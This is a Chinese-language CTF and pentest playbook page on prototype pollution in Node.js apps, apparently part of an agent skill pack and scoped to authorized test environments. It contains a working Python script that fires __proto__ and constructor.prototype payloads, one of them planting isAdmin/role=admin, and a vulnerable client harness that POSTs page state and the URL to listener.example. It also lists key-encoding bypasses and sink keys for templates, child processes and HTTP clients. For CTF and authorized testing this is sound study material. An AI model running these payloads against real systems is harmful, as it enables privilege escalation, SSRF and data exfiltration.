# Prototype Pollution (原型链污染)

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/03-injection/prototype-pollution.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「prototype pollution / 原型链污染 / __proto__ / constructor.prototype」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- prototype pollution
- 原型链污染
- __proto__
- constructor.prototype
- EJS
- Pug
- child_process
- Node.js
- qs

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 工作流
2. Source 与 sink 判定矩阵
3. 服务端 PP oracle — 成功样本：发送 marker 后，后续独立 oracle 的身份、权限、配置、错误文本或响应 hash 稳定变化。失败样本：source 接收 payload 但 oracle 不变，说明没有可用 sink 或污染被隔离…
4. key 变体与 parser 差分
5. sink 路由
6. 客户端 PP harness

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — 后续空对象继承 marker，或业务响应变化
- **失败样本** — parser 保留 key 但 merge 跳过危险段
- **命中样本** — `__proto__[x]=y` 进入对象
- **失败样本** — query parser 关闭嵌套
- **命中样本** — 未显式字段的对象获得默认权限或路径
- **失败样本** — 业务只读 own property
- **命中样本** — 渲染错误、输出函数名、helper 行为变化
- **失败样本** — options 用 null-prototype 对象
- **命中样本** — 前端路由/按钮/API base 改变
- **失败样本** — 解析后做 schema 白名单
- **命中样本** — handler merge 后状态变化
- **失败样本** — structured clone 后被 validator 拒绝
- **命中样本** — 新对象默认进入 admin 分支
- **失败样本** — 只用 `hasOwnProperty`

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

原型链污染的核心判断是：不可信键名是否进入递归 merge / path setter / parser，并最终影响某个 sink。单独证明 `{}.polluted === "yes"` 还不够，必须继续证明它改变了鉴权、模板、请求、日志、子进程、渲染或前端路由的行为。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| JSON body 被 deep merge | 发送 `__proto__` 与 `constructor.prototype` 双路线 | 后续空对象继承 marker，或业务响应变化 | parser 保留 key 但 merge 跳过危险段 |
| `qs`/嵌套 query 参数 | 测 `a[b]=c`、数组、点号解析 | `__proto__[x]=y` 进入对象 | query parser 关闭嵌套 |
| 配置对象默认值 | 污染 `isAdmin/role/debug/template` | 未显式字段的对象获得默认权限或路径 | 业务只读 own property |
| 模板引擎 | 路由到 EJS/Pug/Handlebars options | 渲染错误、输出函数名、helper 行为变化 | options 用 null-prototype 对象 |
| 客户端 hash/query 合并 | fragment PP + DOM sink | 前端路由/按钮/API base 改变 | 解析后做 schema 白名单 |
| postMessage/JSON.parse | 发送对象 payload | handler merge 后状态变化 | structured clone 后被 validator 拒绝 |

## 工作流

```text
定位 parser 与 merge/source
  → 用 marker key 建污染 baseline
  → 测 __proto__ / constructor.prototype / dotted path 变体
  → 选择业务 sink: auth/template/process/log/client route
  → 用同一 oracle 证明状态、权限、输出或 flag 差异
  → 记录成功样本和失败样本
```

## 0. Source 与 sink 判定矩阵

| Source | Payload 形态 | Sink 候选 | 观察点 |
|---|---|---|---|
| JSON body | `{"__proto__":{"pp":"x"}}` | API 默认 role/config | `/api/me`、错误字段、权限菜单 |
| Query string | `?__proto__[pp]=x` | Express/qs 中间件 | 后续请求是否继承 marker |
| Form body | `__proto__[pp]=x` | body-parser + merge | 响应 hash、状态字段 |
| postMessage | `{"constructor":{"prototype":...}}` | 前端 store/router | DOM、API base、token |
| YAML/TOML config | `__proto__:` | 任务 runner/config | job 参数、渲染路径 |
| package option | `constructor.prototype` | template/log/process options | 渲染错误、helper/format 行为 |

## 1. 服务端 PP oracle

```python
#!/usr/bin/env python3
import argparse
import copy
import hashlib
import json
import requests

PAYLOADS = [
    ("json_proto_marker", "json", {"__proto__": {"pp_marker": "pp_yes"}}),
    ("json_ctor_marker", "json", {"constructor": {"prototype": {"pp_marker": "pp_yes"}}}),
    ("json_role", "json", {"__proto__": {"isAdmin": True, "role": "admin"}}),
    ("qs_proto_marker", "qs", "__proto__[pp_marker]=pp_yes"),
    ("qs_ctor_marker", "qs", "constructor[prototype][pp_marker]=pp_yes"),
    ("form_proto_marker", "form", {"__proto__[pp_marker]": "pp_yes"}),
    ("form_ctor_marker", "form", {"constructor[prototype][pp_marker]": "pp_yes"}),
]

def digest(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def send(base, path, case, kind, payload, cookie=""):
    sess = requests.Session()
    if cookie:
        sess.headers["Cookie"] = cookie
    url = base.rstrip("/") + path
    if kind == "json":
        r = sess.post(url, json=payload, timeout=10)
    elif kind == "form":
        r = sess.post(url, data=payload, timeout=10)
    else:
        r = sess.get(url + ("&" if "?" in url else "?") + payload, timeout=10)
    return {"case": case, "status": r.status_code, "hash": digest(r.text), "sample": r.text[:180]}

def oracle(base, path, cookie=""):
    headers = {"Cookie": cookie} if cookie else {}
    r = requests.get(base.rstrip("/") + path, headers=headers, timeout=10)
    return {"status": r.status_code, "hash": digest(r.text), "sample": r.text[:220]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--source-path", required=True)
    ap.add_argument("--oracle-path", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    print(json.dumps({"baseline": oracle(args.base, args.oracle_path, args.cookie)}, ensure_ascii=False))
    for case, kind, payload in PAYLOADS:
        sent = send(args.base, args.source_path, case, kind, payload, args.cookie)
        after = oracle(args.base, args.oracle_path, args.cookie)
        print(json.dumps({"send": sent, "after": after}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：发送 marker 后，后续独立 oracle 的身份、权限、配置、错误文本或响应 hash 稳定变化。失败样本：source 接收 payload 但 oracle 不变，说明没有可用 sink 或污染被隔离在局部对象。

## 2. key 变体与 parser 差分

| 变体 | 用途 |
|---|---|
| `__proto__` | 常规对象原型路线 |
| `constructor.prototype` | `__proto__` 被过滤时的替代路线 |
| `prototype` | class/function option 污染 |
| `a.__proto__.x` | dot notation path setter |
| `a[__proto__][x]` | bracket parser |
| `__%70roto__` | 解码顺序差分 |
| `constructor[prototype][x]` | qs/body-parser 路线 |

## 3. sink 路由

| Sink | 污染 key | 命中样本 | 失败样本 |
|---|---|---|---|
| 鉴权默认值 | `isAdmin`, `role`, `permissions` | 新对象默认进入 admin 分支 | 只用 `hasOwnProperty` |
| 模板引擎 options | `outputFunctionName`, `compileDebug`, `client` | 渲染输出/错误栈变化 | options 固定白名单 |
| 子进程 options | `shell`, `env`, `argv0` | job/convert/export 行为变化 | 显式 options 覆盖原型 |
| 日志/格式化 | `format`, `stream`, `level` | 日志输出结构变化 | logger 使用 own config |
| HTTP client | `baseURL`, `headers`, `method` | SSRF/请求头/路径改变 | URL 重新构造 |
| 前端 store | `apiBase`, `isAdmin`, `redirect` | DOM/API/路由变化 | schema 校验拒绝 |

## 4. 客户端 PP harness

```html
<!doctype html>
<meta charset="utf-8">
<script>
function parseHash() {
  const out = {};
  for (const part of location.hash.slice(1).split("&")) {
    const [k, v] = part.split("=");
    if (!k) continue;
    const m = k.match(/^(.+)\[(.+)\]$/);
    if (m) {
      out[m[1]] = out[m[1]] || {};
      out[m[1]][m[2]] = decodeURIComponent(v || "");
    } else {
      out[k] = decodeURIComponent(v || "");
    }
  }
  return out;
}
function merge(a, b) {
  for (const k in b) {
    if (b[k] && typeof b[k] === "object") {
      a[k] = a[k] || {};
      merge(a[k], b[k]);
    } else {
      a[k] = b[k];
    }
  }
  return a;
}
const before = {}.pp_marker;
merge({}, parseHash());
fetch("https://listener.example/pp", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify({before, after: {}.pp_marker, admin: {}.isAdmin, href: location.href})
});
</script>
```

测试 URL：

```text
https://target.example/page#constructor[prototype]=x&__proto__[pp_marker]=pp_yes&__proto__[isAdmin]=true
```

## 攻击链

```text
parser/source 命中
  → marker 证明原型污染
  → 业务 sink 路由
  → auth/template/process/client route oracle
  → 权限、渲染、请求、flag 差异
```

## Evidence

| 项 | 记录内容 |
|---|---|
| Source | URL、method、content-type、parser、payload 形态 |
| 污染证明 | marker key、前后 oracle、响应 hash、错误文本 |
| Sink | key 名、触发路径、业务动作、状态变化 |
| 成功样本 | 权限/渲染/请求/flag 差异可重复出现 |
| 失败样本 | parser 不解析嵌套、merge 跳过 key、sink 只读 own property |
| 下一跳 | 前端转 `07-client/js-runtime/postmessage`；模板转 SSTI；token 转 JWT |
